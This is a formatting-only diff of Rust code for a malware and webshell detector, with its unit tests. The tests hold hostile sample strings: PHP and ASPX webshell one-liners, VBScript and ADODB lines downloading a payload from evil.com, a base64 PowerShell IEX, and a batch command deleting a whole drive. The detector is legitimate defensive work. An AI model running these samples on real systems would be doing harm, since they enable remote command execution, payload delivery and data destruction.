@@ -225,7 +225,12 @@ fn match_capabilities(hay: &str) -> Vec<Cap> {
 
     // China Chopper / generic ASPX process-runner webshell pattern.
     if any(&["system.diagnostics.process", "process.start(", "cmd.exe /c"])
-        && any(&["request[", "request.item[", "request.form[", "request.querystring["])
+        && any(&[
+            "request[",
+            "request.item[",
+            "request.form[",
+            "request.querystring[",
+        ])
     {
         caps.push(Cap {
             name: "Script.AspWebshell.ProcessRunner",
@@ -257,8 +262,21 @@ fn match_capabilities(hay: &str) -> Vec<Cap> {
     // VBScript can omit parentheses: `sh.Run "url"` is valid syntax, so we
     // match both `.run(` and `.run ` (with trailing space / quote).
     if any(&["wscript.shell", "\"wscript.shell\""])
-        && any(&[".run(", ".run \"", ".run '", ".exec(", "shell.run", ".exec \""])
-        && any(&["http://", "https://", "%appdata%", "%temp%", "%userprofile%"])
+        && any(&[
+            ".run(",
+            ".run \"",
+            ".run '",
+            ".exec(",
+            "shell.run",
+            ".exec \"",
+        ])
+        && any(&[
+            "http://",
+            "https://",
+            "%appdata%",
+            "%temp%",
+            "%userprofile%",
+        ])
     {
         caps.push(Cap {
             name: "Script.VbsDropper.WScriptRun",
@@ -545,10 +563,7 @@ mod tests {
     fn php_assert_bypass() {
         let hay = lower("<?php assert(base64_decode($_POST['c'])); ?>");
         let d = analyze(&hay);
-        assert!(
-            d.iter().any(|x| x.name.contains("AssertBypass")),
-            "{d:?}"
-        );
+        assert!(d.iter().any(|x| x.name.contains("AssertBypass")), "{d:?}");
     }
 
     #[test]
@@ -556,7 +571,8 @@ mod tests {
         let hay = lower("Execute Request(\"cmd\")");
         let d = analyze(&hay);
         assert!(
-            d.iter().any(|x| x.name.contains("AspWebshell.ExecuteRequest")),
+            d.iter()
+                .any(|x| x.name.contains("AspWebshell.ExecuteRequest")),
             "{d:?}"
         );
     }
@@ -565,10 +581,7 @@ mod tests {
     fn asp_process_runner() {
         let hay = lower(r#"System.Diagnostics.Process.Start("cmd.exe /c " & Request["cmd"])"#);
         let d = analyze(&hay);
-        assert!(
-            d.iter().any(|x| x.name.contains("ProcessRunner")),
-            "{d:?}"
-        );
+        assert!(d.iter().any(|x| x.name.contains("ProcessRunner")), "{d:?}");
     }
 
     #[test]
@@ -578,17 +591,13 @@ mod tests {
             r#": s.Write dl("https://evil.com/p.exe"): s.SaveToFile "C:\p.exe""#,
         ));
         let d = analyze(&hay);
-        assert!(
-            d.iter().any(|x| x.name.contains("AdodbStream")),
-            "{d:?}"
-        );
+        assert!(d.iter().any(|x| x.name.contains("AdodbStream")), "{d:?}");
     }
 
     #[test]
     fn vbs_wscript_run() {
-        let hay = lower(
-            r#"Set sh = CreateObject("WScript.Shell"): sh.Run "https://evil.com/p.exe", 0"#,
-        );
+        let hay =
+            lower(r#"Set sh = CreateObject("WScript.Shell"): sh.Run "https://evil.com/p.exe", 0"#);
         let d = analyze(&hay);
         assert!(d.iter().any(|x| x.name.contains("WScriptRun")), "{d:?}");
     }
@@ -611,10 +620,7 @@ mod tests {
             "$b = [Convert]::FromBase64String('aGVsbG8='); IEX([Text.Encoding]::UTF8.GetString($b))",
         );
         let d = analyze(&hay);
-        assert!(
-            d.iter().any(|x| x.name.contains("Base64Execute")),
-            "{d:?}"
-        );
+        assert!(d.iter().any(|x| x.name.contains("Base64Execute")), "{d:?}");
     }
 
     #[test]
@@ -641,10 +647,7 @@ mod tests {
     fn batch_mass_deletion() {
         let hay = lower("del /f /s /q %systemdrive%\\*.* & rd /s /q C:\\");
         let d = analyze(&hay);
-        assert!(
-            d.iter().any(|x| x.name.contains("MassDeletion")),
-            "{d:?}"
-        );
+        assert!(d.iter().any(|x| x.name.contains("MassDeletion")), "{d:?}");
     }
 
     #[test]
@@ -664,9 +667,7 @@ mod tests {
     #[test]
     fn benign_php_is_clean() {
         // trim($_POST[...]) sanitised before echo — not a webshell pattern.
-        let hay = lower(
-            "<?php $name = htmlspecialchars(trim($_POST['name'])); echo $name; ?>",
-        );
+        let hay = lower("<?php $name = htmlspecialchars(trim($_POST['name'])); echo $name; ?>");
         let d = analyze(&hay);
         assert!(
             d.iter().all(|x| !x.name.contains("PhpWebshell")),
